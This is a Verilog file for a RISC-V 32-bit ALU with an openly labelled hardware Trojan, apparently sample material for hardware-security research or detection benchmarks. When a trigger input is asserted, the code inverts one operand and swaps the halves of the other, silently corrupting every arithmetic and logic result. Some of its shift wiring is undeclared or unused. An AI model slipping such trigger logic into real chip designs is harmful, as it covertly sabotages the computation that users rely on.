 module ALU_RV32I_Trojan #(parameter n = 32) 
    (
        input [n-1:0] op1, op2,
        input [3:0] op_code,
        input trigger,  // Trojan trigger
        output reg [n-1:0] dout,
        output zero_flag, sign_flag,
        output reg cry_out
    );

    wire [4:0] shift_amount = op2[4:0];
    wire [n-1:0] shift_left_result, shift_right_result;
    reg [n-1:0] op1_modified, op2_modified;

    // Hardware Trojan condition: if trigger is high, modify inputs
    always @(*) begin
        if (trigger) begin
            op1_modified = ~op1; // Invert op1
            op2_modified = {op2[15:0], op2[31:16]}; // Swap halves of op2
        end else begin
            op1_modified = op1;
            op2_modified = op2;
        end
    end

    // Original ALU operation with modified inputs based on Trojan trigger
    always@(op1_modified, op2_modified, op_code) begin
        cry_out = 0;
        case (op_code)
            4'b0000: dout = op1_modified & op2_modified;   // AND
            4'b0001: dout = op1_modified | op2_modified;   // OR
            4'b0010: dout = op1_modified ^ op2_modified;   // XOR
            4'b0011: dout = $signed(op1_modified) < $signed(op2_modified);   // SLT
            4'b0100: {cry_out, dout} = op1_modified + op2_modified;   // ADD
            4'b0101: {cry_out, dout} = op1_modified - op2_modified;   // SUB
            4'b0110: dout = op1_modified << shift_amount;  // SLL
            4'b0111: dout = op1_modified >> shift_amount;  // SRL
            4'b1000: dout = op1_modified < op2_modified;   // SLTU
            default: dout = op1_modified;
        endcase
    end
	
	// Shift operations remain unaltered for simplicity
    assign shift_l_1 = shift_amount[0]? {op1[30:0],1'b0} : op1;
    assign shift_l_2 = shift_amount[1]? {op1[29:0],2'b00} : shift_l_1;
    assign shift_l_4 = shift_amount[2]? {op1[27:0],4'b0000} : shift_l_2;
    assign shift_l_8 = shift_amount[3]? {op1[23:0],8'b0000_0000} : shift_l_4;
    assign shift_l = shift_amount[4]? {op1[15:0],16'b0000_0000_0000_0000} : shift_l_8;

    assign shift_r_1 = shift_amount[0]? {1'b0,op1[31:1]} : op1;
    assign shift_r_2 = shift_amount[1]? {2'b00,op1[31:2]} : shift_r_1;
    assign shift_r_4 = shift_amount[2]? {4'b0000,op1[31:4]} : shift_r_2;
    assign shift_r_8 = shift_amount[3]? {8'b0000_0000,op1[31:8]} : shift_r_4;
    assign shift_r = shift_amount[4]? {16'b0000_0000_0000_0000,op1[31:16]} : shift_r_8;


    // Logic for shifts and flag outputs
    assign shift_left_result = op1_modified << shift_amount;
    assign shift_right_result = op1_modified >> shift_amount;
    assign zero_flag = (dout == 0);
    assign sign_flag = dout[n-1];

endmodule
